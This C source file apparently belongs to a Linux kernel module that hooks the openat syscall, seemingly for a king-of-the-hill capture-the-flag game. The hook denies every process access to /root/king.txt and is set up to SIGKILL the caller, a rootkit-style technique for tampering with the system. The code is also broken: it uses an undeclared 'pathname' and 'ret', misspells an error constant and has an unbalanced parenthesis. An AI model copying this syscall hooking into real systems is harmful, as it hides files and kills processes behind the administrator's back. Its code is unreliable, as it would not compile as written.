#include "openAt.h"
#include <linux/limits.h>

short closeProcess = 0;

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long (*ogOpenAt)(struct pt_regs *regs);
asmlinkage long hookOpenAt(struct pt_regs *regs) {
	int dfd = regs->di;
	char __user *filename = (char *) regs->si;
	int flags = regs->dx;
#else
asmlinkage long (*ogOpenAt)(int dfd, const char __user *filename, int flags, umode_t mode);
asmlinkage long hookOpenAt(int dfd, const char __user *filename, int flags, umode_t mode) {
#endif
	struct path file_path;
	struct inode *inode, *blocked_inode;
	
	if (kern_path(pathname, 0, &file_path))
		return -EACCES;
	inode = file_path.dentry -> d_inode;
	
	if (kern_path("/root/king.txt", 0, &file_path)
		return 0;
	
	blocked_inode = file_path.dentry -> d_inode;
	if (blocked_inode == inode)
		return -EACCESS;
	// Checks if /root/king.txt and if it's a hard symlink. //TODO ADD SOFT & REL
	if ((ret == -1) && (closeProcess == 1)) {
		struct kernel_siginfo info;
		memset(&info, 0, sizeof(struct kernel_siginfo));
		info.si_signo = SIGKILL;
		send_sig_info(SIGKILL, &info, current);
	}
#ifdef PTREGS_SYSCALL_STUBS
	if (ret == 0) ret = ogOpenAt(regs);
#else
	if (ret == 0) ret = ogOpenAt(dfd, filename, flags, mode);
#endif
	return ret;
}
